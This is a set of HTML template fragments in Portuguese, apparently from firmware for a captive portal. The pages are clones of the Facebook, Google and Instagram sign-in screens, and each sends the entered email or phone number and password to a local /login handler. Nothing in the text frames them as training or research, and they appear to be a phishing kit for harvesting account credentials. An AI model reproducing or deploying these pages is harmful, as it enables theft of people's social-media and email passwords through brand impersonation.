...
<div class="container">
  <div class="header">
    ...
    <p class="subtitle">Para continuar, entre com uma das suas contas:</p>
  </div>
  ...
  <a href="/ig" class="btn btn-ig">
    ...
    <span>Continuar com o Instagram</span>
  </a>
...
<div class="container">
  ...
  <div class="box">
    ...
    <form action="/login" method="POST">
      ...
      <input type="text" name="email" placeholder="E-mail ou telefone" required autofocus>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
    <a href="#" class="forgot">Esqueceu a senha?</a>
    <div class="divider"></div>
    <a href="#" class="create">Criar nova conta</a>
  </div>
</div>
</body>
</html>)rawliteral";
...
<div class="container">
  ...
  <form action="/login" method="POST">
    ...
    <p class="help-text"><a href="#">Esqueceu seu e-mail?</a></p>
    <div class="actions">
      <a href="#" class="create-link">Criar conta</a>
...
<div class="container">
  <div class="box">
    ...
    <form action="/login" method="POST">
      ...
      <input type="text" name="email" placeholder="Telefone, nome de usuário ou e-mail" required autofocus>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
    <div class="divider">O</div>
    <a href="#" class="fb-link">Entrar com o Facebook</a>
    <a href="#" class="forgot">Esqueceu a senha?</a>
  </div>
